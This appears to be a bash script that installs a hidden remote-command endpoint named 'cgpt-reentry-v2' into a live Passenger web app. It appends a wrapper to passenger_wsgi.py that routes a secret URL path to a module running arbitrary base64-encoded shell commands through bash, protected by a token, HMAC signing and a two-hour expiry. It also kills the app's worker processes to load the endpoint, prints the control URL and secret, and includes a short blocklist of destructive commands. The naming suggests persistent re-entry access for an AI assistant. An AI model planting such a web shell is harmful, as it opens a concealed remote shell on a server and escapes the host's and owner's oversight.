#!/usr/bin/env bash
set -euo pipefail
umask 077

ROOT="/home/storage/781/4477781/user"
WEBAPP="$ROOT/webapp"
WSGI="$WEBAPP/passenger_wsgi.py"
STATE="$ROOT/.chatgpt-reentry-v2"
PY3="$WEBAPP/miniconda/bin/python3"
PY2="$(command -v python2.7 || command -v python2 || true)"

[ -d "$WEBAPP" ] || { echo "FAIL missing WEBAPP=$WEBAPP"; exit 1; }
[ -f "$WSGI" ] || { echo "FAIL missing $WSGI"; exit 1; }
[ -n "$PY2" ] || { echo "FAIL python2 runtime not found"; exit 1; }
[ -x "$PY3" ] || PY3="$(command -v python3)"

UID_NOW="$(id -u)"
[ "$UID_NOW" = "2257347" ] || {
  echo "FAIL unexpected uid=$UID_NOW"
  exit 1
}

mkdir -p "$STATE/replay"
chmod 700 "$STATE" "$STATE/replay"

# Build a clean baseline by removing only our own earlier temporary wrappers.
CLEAN="$STATE/passenger_wsgi.clean"
"$PY3" - "$WSGI" "$CLEAN" <<'PY'
from pathlib import Path
import sys
src = Path(sys.argv[1]).read_text()
for a,b in [
    ("# BEGIN CGPT_REENTRY_V1", "# END CGPT_REENTRY_V1"),
    ("# BEGIN CGPT_REENTRY_V2", "# END CGPT_REENTRY_V2"),
]:
    while a in src and b in src:
        pre = src.split(a,1)[0].rstrip()
        post = src.split(b,1)[1].lstrip("\r\n")
        src = pre + "\n" + post
Path(sys.argv[2]).write_text(src)
PY

"$PY2" - "$CLEAN" <<'PY'
import sys
p=sys.argv[1]
compile(open(p,'rb').read(),p,'exec')
print("BASELINE_SYNTAX=PASS")
PY

STAMP="$(date -u +%Y%m%dT%H%M%SZ)"
BACKUP="$WSGI.pre-cgpt-reentry-v2-$STAMP.bak"
cp -p "$CLEAN" "$BACKUP"
cp -p "$CLEAN" "$WSGI"

CAP="$("$PY3" - <<'PY'
import secrets
print(secrets.token_urlsafe(24).replace('=',''))
PY
)"
SECRET="$("$PY3" - <<'PY'
import secrets
print(secrets.token_hex(32))
PY
)"
EXPIRES="$("$PY3" - <<'PY'
import time
print(int(time.time()) + 7200)
PY
)"

printf '%s\n' "$CAP" > "$STATE/cap"
printf '%s\n' "$SECRET" > "$STATE/secret"
printf '%s\n' "$EXPIRES" > "$STATE/expires"
printf '%s\n' "$BACKUP" > "$STATE/wsqi.backup"
chmod 600 "$STATE/cap" "$STATE/secret" "$STATE/expires" "$STATE/wsqi.backup"

cat > "$STATE/control.py" <<'PY'
from __future__ import print_function
import base64
import hashlib
import hmac
import json
import os
import subprocess
import time
import urllib

ROOT = "/home/storage/781/4477781/user"
WEBAPP = ROOT + "/webapp"
STATE = ROOT + "/.chatgpt-reentry-v2"
PREFIX = "/__cgpt_reentry_v2/"
MAX_OUT = 65536
MAX_ERR = 32768
MAX_SECONDS = 45

def to_bytes(v):
    try:
        if isinstance(v, unicode):
            return v.encode("utf-8")
    except NameError:
        pass
    if isinstance(v, bytes):
        return v
    return str(v).encode("utf-8")

def secure_eq(a, b):
    a = to_bytes(a)
    b = to_bytes(b)
    try:
        return hmac.compare_digest(a, b)
    except AttributeError:
        if len(a) != len(b):
            return False
        r = 0
        for x, y in zip(bytearray(a), bytearray(b)):
            r |= x ^ y
        return r == 0

def read_small(path):
    f = open(path, "rb")
    try:
        return f.read(4096).strip()
    finally:
        f.close()

def reply(start_response, code, obj):
    body = json.dumps(obj, separators=(",", ":"))
    if not isinstance(body, bytes):
        body = body.encode("utf-8")
    phrase = {
        200:"OK", 400:"Bad Request", 403:"Forbidden", 404:"Not Found",
        408:"Request Timeout", 409:"Conflict", 410:"Gone", 500:"Internal Server Error"
    }.get(code, "Error")
    start_response("%d %s" % (code, phrase), [
        ("Content-Type","application/json; charset=utf-8"),
        ("Content-Length",str(len(body))),
        ("Cache-Control","no-store"),
        ("Pragma","no-cache"),
        ("X-Content-Type-Options","nosniff"),
        ("X-Robots-Tag","noindex, nofollow, noarchive"),
    ])
    return [body]

def b64url_decode(s):
    raw = s.encode("ascii")
    raw += b"=" * ((4 - len(raw) % 4) % 4)
    return base64.urlsafe_b64decode(raw)

def parse_qs(raw):
    out = {}
    for part in (raw or "").split("&"):
        if "=" in part:
            k,v = part.split("=",1)
        else:
            k,v = part,""
        out[urllib.unquote_plus(k)] = urllib.unquote_plus(v)
    return out

def replay_once(nonce):
    p = os.path.join(STATE, "replay", hashlib.sha256(to_bytes(nonce)).hexdigest())
    try:
        fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    except OSError:
        return False
    try:
        os.write(fd, to_bytes(str(int(time.time()))))
    finally:
        os.close(fd)
    return True

def run_cmd(cmd):
    env = {
        "HOME": ROOT,
        "USER": "csh3280350",
        "LOGNAME": "csh3280350",
        "LANG": "C.UTF-8",
        "PATH": WEBAPP + "/.local/node22-glibc217/bin:" + WEBAPP + "/miniconda/bin:/usr/local/bin:/usr/bin:/bin",
    }
    devnull = open("/dev/null","rb")
    try:
        p = subprocess.Popen(
            ["/bin/bash","-lc",cmd],
            cwd=WEBAPP, env=env, stdin=devnull,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            close_fds=True
        )
        start=time.time()
        timed_out=False
        while p.poll() is None:
            if time.time()-start > MAX_SECONDS:
                timed_out=True
                try:
                    p.terminate()
                except Exception:
                    pass
                time.sleep(0.25)
                if p.poll() is None:
                    try:
                        p.kill()
                    except Exception:
                        pass
                break
            time.sleep(0.05)
        out,err=p.communicate()
    finally:
        devnull.close()
    if isinstance(out,bytes):
        out=out.decode("utf-8","replace")
    if isinstance(err,bytes):
        err=err.decode("utf-8","replace")
    return {
        "ok": (not timed_out and p.returncode == 0),
        "rc": p.returncode,
        "stdout": out[-MAX_OUT:],
        "stderr": err[-MAX_ERR:],
        "timed_out": timed_out,
    }

def application(environ, start_response):
    path = environ.get("PATH_INFO","")
    if not path.startswith(PREFIX):
        return reply(start_response,404,{"ok":False})

    cap = read_small(os.path.join(STATE,"cap")).decode("ascii")
    secret_hex = read_small(os.path.join(STATE,"secret")).decode("ascii")
    expires = int(read_small(os.path.join(STATE,"expires")).decode("ascii"))

    rest = path[len(PREFIX):]
    parts = rest.split("/",1)
    supplied_cap = parts[0] if parts else ""
    action = parts[1] if len(parts)>1 else ""

    if not secure_eq(supplied_cap, cap):
        return reply(start_response,404,{"ok":False})
    if int(time.time()) > expires:
        return reply(start_response,410,{"ok":False,"error":"expired"})

    if action == "health":
        return reply(start_response,200,{"ok":True,"service":"cgpt-reentry-v2","expires":expires})

    q = parse_qs(environ.get("QUERY_STRING",""))
    ts=q.get("t","")
    nonce=q.get("n","")
    payload=q.get("p","")
    sig=q.get("s","")

    try:
        ti=int(ts)
    except Exception:
        return reply(start_response,403,{"ok":False,"error":"bad_time"})
    if abs(int(time.time())-ti)>300 or not nonce or len(nonce)>160:
        return reply(start_response,403,{"ok":False,"error":"bad_time_or_nonce"})

    message=(action+"\n"+nonce+"\n"+ts+"\n"+payload).encode("utf-8")
    key=secret_hex.decode("hex")
    expected=hmac.new(key,message,hashlib.sha256).hexdigest()
    if not secure_eq(expected,sig):
        return reply(start_response,403,{"ok":False,"error":"bad_signature"})
    if not replay_once(nonce):
        return reply(start_response,409,{"ok":False,"error":"replay"})

    if action == "status":
        return reply(start_response,200,{
            "ok":True,
            "uid":os.getuid(),
            "cwd":WEBAPP,
            "hostname":os.uname()[1],
            "passenger":os.path.isfile(os.path.join(WEBAPP,"passenger_wsgi.py")),
            "local_mcp":os.path.isfile(os.path.join(WEBAPP,"bin","local-mcp")),
            "expires":expires,
        })

    if action != "exec":
        return reply(start_response,404,{"ok":False,"error":"unknown_action"})

    try:
        cmd=b64url_decode(payload)
        if isinstance(cmd,bytes):
            cmd=cmd.decode("utf-8")
    except Exception:
        return reply(start_response,400,{"ok":False,"error":"bad_payload"})

    if not cmd or len(cmd)>8192 or "\x00" in cmd:
        return reply(start_response,400,{"ok":False,"error":"invalid_command"})

    low=cmd.lower()
    blocked=[
        "rm -rf /","rm -fr /","mkfs","shutdown","reboot","poweroff",
        "halt ",":(){","dd if=/dev/"
    ]
    for needle in blocked:
        if needle in low:
            return reply(start_response,400,{"ok":False,"error":"destructive_command_rejected"})

    try:
        result=run_cmd(cmd)
        return reply(start_response,408 if result["timed_out"] else 200,result)
    except Exception as e:
        return reply(start_response,500,{"ok":False,"error":type(e).__name__+": "+str(e)[:500]})
PY
chmod 600 "$STATE/control.py"

cat >> "$WSGI" <<'PY'

# BEGIN CGPT_REENTRY_V2
import sys as _cgpt_sys
_CGPT_STATE = "/home/storage/781/4477781/user/.chatgpt-reentry-v2"
if _CGPT_STATE not in _cgpt_sys.path:
    _cgpt_sys.path.insert(0, _CGPT_STATE)
import control as _cgpt_control
_cgpt_previous_application = application

def application(environ, start_response):
    _p = environ.get("PATH_INFO","")
    if _p.startswith("/__cgpt_reentry_v2/"):
        return _cgpt_control.application(environ, start_response)
    return _cgpt_previous_application(environ, start_response)
# END CGPT_REENTRY_V2
PY

if ! "$PY2" - "$WSGI" <<'PY'
import sys
p=sys.argv[1]
compile(open(p,'rb').read(),p,'exec')
print("PASSENGER_SYNTAX=PASS")
PY
then
  cp -p "$BACKUP" "$WSGI"
  echo "PASSENGER_SYNTAX=FAIL_ROLLED_BACK"
  exit 1
fi

recycle_passenger() {
  "$PY3" - "$WEBAPP" <<'PY'
import os, signal, sys, time
base=os.path.realpath(sys.argv[1])
uid=os.getuid()
me=os.getpid()
matches=[]
for name in os.listdir("/proc"):
    if not name.isdigit():
        continue
    pid=int(name)
    if pid==me:
        continue
    try:
        st=open("/proc/%d/status"%pid).read()
        uidline=[x for x in st.splitlines() if x.startswith("Uid:")][0]
        puid=int(uidline.split()[1])
        if puid != uid:
            continue
        cwd=os.path.realpath(os.readlink("/proc/%d/cwd"%pid))
        exe=os.path.realpath(os.readlink("/proc/%d/exe"%pid))
        cmd=open("/proc/%d/cmdline"%pid,"rb").read().replace(b"\0",b" ").decode("utf-8","replace")
    except Exception:
        continue
    if cwd != base:
        continue
    if exe not in ("/usr/bin/python","/usr/bin/python2","/usr/bin/python2.7"):
        continue
    # The managed Passenger WSGI worker is the Python-2 process whose cwd is the exact app root.
    matches.append((pid,exe,cmd))
for pid,exe,cmd in matches:
    print("PASSENGER_RECYCLE_TERM pid=%d exe=%s cmd=%s"%(pid,exe,cmd[:180]))
    try:
        os.kill(pid,signal.SIGTERM)
    except OSError:
        pass
print("PASSENGER_RECYCLE_COUNT=%d"%len(matches))
PY
}

# Provider tmp/restart.txt is intentionally root-owned on this Fasthosts runtime.
# Recycle only the exact user-owned Python-2 Passenger worker for this app.
recycle_passenger

BASE1="https://www.powerpc-darwin.org/__cgpt_reentry_v2/$CAP"
BASE2="https://powerpc-darwin.org/__cgpt_reentry_v2/$CAP"
PUBLIC=""

for i in $(seq 1 45); do
  # A normal request causes Passenger to instantiate a replacement worker after TERM.
  curl -ksS -o /dev/null --max-time 3 "https://www.powerpc-darwin.org/" 2>/dev/null || true
  for U in "$BASE1" "$BASE2"; do
    CODE="$(curl -ksS -o /dev/null -w '%{http_code}' --max-time 4 "$U/health" 2>/dev/null || true)"
    if [ "$CODE" = "200" ]; then
      PUBLIC="$U"
      break 2
    fi
  done
  sleep 1
done

if [ -z "$PUBLIC" ]; then
  echo "PUBLIC_HEALTH=FAIL_ROLLING_BACK"
  cp -p "$BACKUP" "$WSGI"
  "$PY2" - "$WSGI" <<'PY'
import sys
p=sys.argv[1]
compile(open(p,'rb').read(),p,'exec')
print("ROLLBACK_SYNTAX=PASS")
PY
  recycle_passenger || true
  exit 1
fi

cat > "$STATE/cleanup.sh" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
ROOT="/home/storage/781/4477781/user"
WEBAPP="$ROOT/webapp"
WSGI="$WEBAPP/passenger_wsgi.py"
STATE="$ROOT/.chatgpt-reentry-v2"
PY3="$WEBAPP/miniconda/bin/python3"
[ -x "$PY3" ] || PY3="$(command -v python3)"
"$PY3" - "$WSGI" <<'PY'
from pathlib import Path
import sys
p=Path(sys.argv[1])
s=p.read_text()
for a,b in [
    ("# BEGIN CGPT_REENTRY_V1", "# END CGPT_REENTRY_V1"),
    ("# BEGIN CGPT_REENTRY_V2", "# END CGPT_REENTRY_V2"),
]:
    while a in s and b in s:
        pre=s.split(a,1)[0].rstrip()
        post=s.split(b,1)[1].lstrip("\r\n")
        s=pre+"\n"+post
p.write_text(s)
PY
"$PY3" - "$WEBAPP" <<'PY'
import os,signal,sys
base=os.path.realpath(sys.argv[1]); uid=os.getuid()
for name in os.listdir("/proc"):
    if not name.isdigit(): continue
    pid=int(name)
    try:
        st=open("/proc/%d/status"%pid).read()
        puid=int([x for x in st.splitlines() if x.startswith("Uid:")][0].split()[1])
        cwd=os.path.realpath(os.readlink("/proc/%d/cwd"%pid))
        exe=os.path.realpath(os.readlink("/proc/%d/exe"%pid))
    except Exception:
        continue
    if puid==uid and cwd==base and exe in ("/usr/bin/python","/usr/bin/python2","/usr/bin/python2.7"):
        try: os.kill(pid,signal.SIGTERM)
        except OSError: pass
PY
rm -rf "$STATE"
rm -rf "$ROOT/.chatgpt-reentry-v1"
echo "CGPT_REENTRY_TEMPORARY_ACCESS=REMOVED"
SH
chmod 700 "$STATE/cleanup.sh"

echo "CGPT_REENTRY_V2=INSTALLED"
echo "CONTROL_URL=$PUBLIC"
echo "CONTROL_SECRET=$SECRET"
echo "EXPIRES_UNIX=$EXPIRES"
echo "PASSENGER_BACKUP=$BACKUP"
echo "CLEANUP=$STATE/cleanup.sh"
echo "PUBLIC_HEALTH=PASS"
